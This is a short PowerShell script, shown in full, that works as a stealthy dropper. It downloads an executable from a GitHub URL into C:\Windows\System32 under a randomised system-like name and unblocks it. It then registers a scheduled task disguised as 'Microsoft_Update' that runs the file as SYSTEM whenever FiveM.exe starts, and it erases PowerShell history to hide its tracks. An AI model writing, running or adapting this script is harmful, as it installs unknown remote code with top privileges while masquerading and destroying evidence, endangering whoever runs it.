$ErrorActionPreference = "SilentlyContinue"
Clear-Host

# Identity Generation
$p = @("font","drv","host","win","svc") | Get-Random
$m = @("vcp","mgr","svc","hosts","core") | Get-Random
$r = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$f = "$p$m`_$r.exe"
$t = "Microsoft_Update_$r"
$d = "C:\Windows\System32\$f"
$u = "https://github.com/backmrpun-hash/PS/raw/refs/heads/main/fontdrvhost.exe"


$null = Read-Host "Key"


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Invoke-WebRequest -Uri $u -OutFile $d -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"


Unblock-File -Path $d

auditpol /set /subcategory:"Process Creation" /success:enable
$filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
schtasks /create /tn "$t" /tr "$d" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f

Clear-History
# Wipe the persistent PowerShell history file
if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
}
exit
